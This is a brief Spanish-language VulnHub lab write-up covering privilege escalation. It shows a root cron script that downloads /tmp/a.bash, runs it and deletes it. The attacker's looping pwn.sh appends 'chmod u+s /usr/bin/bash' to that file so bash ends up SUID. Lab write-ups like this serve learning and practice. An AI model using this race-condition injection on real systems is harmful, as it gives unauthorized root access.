-----------
- Tags:  #writeup #info #vulnhub #tutorial
---------------------

# Privesc

- *Haciendo uso de [[Pspy]] logramos ver que se ejecuta el siguiente script en tiempos irregulares de tiempo*:
```bash
	cat /opt/check_for_install.sh 
#!/bin/bash


/usr/bin/curl "http://127.0.0.1/9842734723948024.bash" > /tmp/a.bash

chmod +x /tmp/a.bash
chmod +r /tmp/a.bash
chmod +w /tmp/a.bash

/bin/bash /tmp/a.bash

rm -rf /tmp/a.bash

```

### En este punto crearemos un bucle infinito que deposite codigo malicioso en el archivo *a.bash* todo el tiempo para que antes de que se borre inyecte codigo malicioso:

```bash
	cat pwn.sh 
#!/bin/bash

while true
do
        echo "chmod u+s /usr/bin/bash" >> a.bash
        echo "vuelta completada"
done

```

- *Despues de un tiempo de ejecucion, ya tendriamos la bash con permisos SUID*